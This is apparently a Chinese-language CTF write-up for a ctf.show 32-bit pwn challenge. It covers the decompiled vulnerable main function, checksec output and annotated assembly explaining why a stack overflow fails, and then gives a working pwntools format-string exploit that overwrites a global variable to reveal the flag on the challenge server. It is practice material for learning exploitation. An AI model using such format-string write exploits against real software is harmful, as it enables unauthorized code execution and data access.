## 题目描述

```cpp
// bad sp value at call has been detected, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-80h]
  int v5; // [esp-10h] [ebp-7Ch]
  int v6; // [esp-Ch] [ebp-78h]
  int v7; // [esp-8h] [ebp-74h]
  int v8; // [esp-4h] [ebp-70h]
  char format[100]; // [esp+0h] [ebp-6Ch] BYREF
  int *p_argc; // [esp+64h] [ebp-8h]

  p_argc = &argc;
  setvbuf(stdin, 0, 1, 0);
  setvbuf(stdout, 0, 2, 0);
  printf("try pwn me?");
  ((void (__stdcall *)(const char *, char *, int, int, int, int, int))__isoc99_scanf)("%s", format, v4, v5, v6, v7, v8);
  printf(format);
  if ( num == 16 )
    system("cat flag");
  else
    puts(aYouMayNeedToKe);
  return 0;
}
```

```bash
(temp) nullsky@Shader:~/Workspaces/temp$ pwn checksec pwn
[*] '/home/nullsky/Workspaces/temp/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

```asm
; --- main函数开头 (Prologue) ---
lea     ecx, [esp+4]         ; 将原始栈指针存入 ecx
and     esp, 0FFFFFFF0h      ; 强制 16 字节对齐，esp 此时会向下跳到一个新位置
push    dword ptr [ecx-4]    ; 将原始返回地址压入对齐后的栈，实际上用不到，给调试器看的
push    ebp                  ; 保存老 ebp
mov     ebp, esp             ; 设置新 ebp
push    ebx
push    ecx                  ; 【关键】将 ecx (原始栈指针) 备份在栈上 [ebp-8] 的位置
...
; --- main函数结尾 (Epilogue) ---
lea     esp, [ebp-8]         ; 让 esp 指向备份 ecx 的地方
pop     ecx                  ; 【致命】从栈上弹回原始指针到 ecx
pop     ebx
pop     ebp
lea     esp, [ecx-4]         ; 【陷阱】利用 ecx 恢复真正的栈顶
retn                         ; 弹出 esp 指向的地址到 EIP
```

## 解题过程

> [!fail] 尝试1
> 看到没有 canary ，想法是直接用栈溢出返回到 `system` 的位置就好了

然而，这就太低估这个程序了，仔细看这个程序的汇编，使用了栈对齐优化，这就导致变得类似于 canary 一样了，详细解释在 [[栈溢出#^b61420]]

> [!check] 正解
> 使用格式化字符串修改 `num`

首先我们需要确定 `num` 的地址，用IDA可以看
```
.bss:0804A030                                   public num
```

然后，我们需要确定 `offset` ，这样 `printf` 才能识别目标地址
```python
from pwn import *

context.terminal = ['gnome-terminal', '--', 'sh', '-c']
context.arch = 'i386'
context.log_level = 'debug'
context.gdb_binary = 'pwndbg'

elf = ELF("./pwn")

p = process(['./pwn'])

payload = b"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"

p.sendline(payload)
p.interactive()
```
![[Pasted image 20260417190536.png]]
所以我们想要的 `offset` 是 7

我们想要写入的值是 `16`

ok，我们已经收集完需要的信息，开始写 exploit
```python
from pwn import *

context.terminal = ['gnome-terminal', '--', 'sh', '-c']
context.arch = 'i386'
context.log_level = 'debug'
context.gdb_binary = 'pwndbg'

elf = ELF("./pwn")

# p = process(['./pwn'])
p = remote('pwn.challenge.ctf.show', 28155)

offset = 7
writes = {0x0804A030: 16}

payload = fmtstr_payload(offset, writes)

p.sendline(payload)
p.interactive()
```